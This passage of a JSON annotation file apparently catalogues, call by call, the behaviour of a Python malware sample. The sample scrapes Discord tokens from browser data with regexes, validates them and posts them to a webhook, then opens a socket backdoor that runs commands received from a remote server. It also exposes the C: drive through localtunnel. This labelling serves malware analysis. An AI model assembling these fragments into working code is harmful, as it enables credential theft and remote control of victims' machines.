              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "path",
              "object_description": "Browser data directory",
              "object_id": "browser_data_directory",
              "intention_description": "Determine presence of directory",
              "intention_id": "determine_directory_presence"
            },
            {
              "action_api": "os.listdir()",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "path",
              "object_description": "Browser data directory",
              "object_id": "browser_data_directory",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "f\"{path}\\\\{file_name}\", errors=\"ignore\"",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "re.findall()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "r\"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}\", line",
              "object_description": "Regex file content",
              "object_id": "regex_file_content",
              "intention_description": "Extract encrypted Discord tokens",
              "intention_id": "extract_encrypted_discord_tokens"
            },
            {
              "action_api": "re.findall()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "r\"mfa\\.[\\w-]{84}\", line",
              "object_description": "Regex file content",
              "object_id": "regex_file_content",
              "intention_description": "Extract encrypted Discord tokens",
              "intention_id": "extract_encrypted_discord_tokens"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "randomfilename, 'w'",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Write token data to file",
              "intention_id": "write_token_data_file"
            },
            {
              "action_api": "get()",
              "action_description": "Sends HTTP GET request to URL",
              "action_id": "open_url_get",
              "object": "'https://discordapp.com/api/v9/users/@me', headers=headers",
              "object_description": "Discord API endpoint",
              "object_id": "discord_api_endpoint",
              "intention_description": "Determine presence of valid authentication",
              "intention_id": "determine_valid_authentication_presence"
            },
            {
              "action_api": "pf.python_version()",
              "action_description": "Retrieves Python interpreter version",
              "action_id": "get_python_version",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Get system info",
              "intention_id": "get_system_info"
            },
            {
              "action_api": "json.dumps()",
              "action_description": "Serializes Python object to JSON string",
              "action_id": "serialize_to_json",
              "object": "heading",
              "object_description": "JSON string",
              "object_id": "json_string",
              "intention_description": "Serialize data",
              "intention_id": "serialize_data"
            },
            {
              "action_api": "post()",
              "action_description": "Opens URL with POST data",
              "action_id": "open_url_post",
              "object": "VARIABLES.webhook, headers={\"content-type\": \"application/json\"}, data=json.dumps(heading).encode()",
              "object_description": "Discord webhook URL",
              "object_id": "discord_webhook_url",
              "intention_description": "Send Discord tokens to server",
              "intention_id": "send_discord_tokens_server"
            },
            {
              "action_api": "os.getcwd()",
              "action_description": "Returns current working directory",
              "action_id": "get_working_dir",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Collect working directory",
              "intention_id": "collect_working_directory"
            },
            {
              "action_api": "sock.socket()",
              "action_description": "Creates new socket object",
              "action_id": "create_socket",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Establish connection",
              "intention_id": "establish_connection"
            },
            {
              "action_api": "s.connect()",
              "action_description": "Establishes TCP connection to specified address",
              "action_id": "establish_tcp_connection",
              "object": "(VARIABLES.serverip, VARIABLES.port)",
              "object_description": "Public IP address and port",
              "object_id": "public_ip_port",
              "intention_description": "Connect to remote server",
              "intention_id": "connect_remote_server"
            },
            {
              "action_api": "self.cwd.encode()",
              "action_description": "Encodes string to bytes using default encoding",
              "action_id": "encode_string_to_bytes",
              "object": "self.cwd",
              "object_description": "Current working directory",
              "object_id": "current_working_directory",
              "intention_description": "Encode string to bytes",
              "intention_id": "encode_string_to_bytes"
            },
            {
              "action_api": "s.send()",
              "action_description": "Sends data over socket connection",
              "action_id": "send_socket_data",
              "object": "self.cwd.encode()",
              "object_description": "Current working directory",
              "object_id": "current_working_directory",
              "intention_description": "Send working directory to server",
              "intention_id": "send_working_directory_server"
            },
            {
              "action_api": "s.recv()",
              "action_description": "Receives data from socket connection",
              "action_id": "receive_socket_data",
              "object": "VARIABLES.buffer",
              "object_description": "Buffer size",
              "object_id": "",
              "intention_description": "Receive command from server",
              "intention_id": "receive_command_from_server"
            },
            {
              "action_api": "sp.getoutput()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "\"npm install -g localtunnel\"",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Execute command",
              "intention_id": "execute_command"
            },
            {
              "action_api": "sp.getoutput()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "f\"lt --port {tunnel_port}\"",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Execute command",
              "intention_id": "execute_command"
            },
            {
              "action_api": "sp.getoutput()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "f\"python -m http.server --directory C:// {tunnel_port}\"",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Execute command",
              "intention_id": "execute_command"
            },
            {
              "action_api": "sp.getoutput()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "command",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Execute received command",
              "intention_id": "execute_received_command"
            },
            {
              "action_api": "message.encode()",
              "action_description": "Encodes string to bytes using default encoding",
              "action_id": "encode_string_to_bytes",
              "object": "message",
              "object_description": "Command output",
              "object_id": "command_output",
              "intention_description": "Encode string to bytes",
              "intention_id": "encode_string_to_bytes"
            },
            {
              "action_api": "s.send()",
              "action_description": "Sends data over socket connection",
              "action_id": "send_socket_data",
              "object": "message.encode()",
              "object_description": "Command output",
              "object_id": "command_output",
              "intention_description": "Send command output to server",
              "intention_id": "send_command_output_server"
            },
            {
              "action_api": "s.close()",
              "action_description": "Closes the socket connection",
              "action_id": "close_socket",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Release connection resource",
              "intention_id": "release_connection_resource"
            }
          ]
        }
      ]
    }
  ]
}